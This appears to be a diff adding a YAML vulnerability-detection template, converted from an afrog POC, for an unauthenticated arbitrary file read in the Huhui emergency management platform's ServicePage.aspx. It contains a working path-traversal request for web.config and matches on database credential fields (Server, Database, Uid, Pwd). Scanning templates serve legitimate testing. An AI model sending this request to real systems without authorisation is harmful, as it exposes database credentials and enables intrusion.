@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - Server
+          - Database
+          - Uid
+          - Pwd
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config'
+id: huhui-servicepage-fileread
+info:
+  author: avic123
+  description: 互慧-急诊综合管理平台 ServicePage.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 互慧-急诊综合管理平台-ServicePage.aspx-任意文件读取漏洞
+  severity: critical
+  tags: huhui,fileread,argus-import
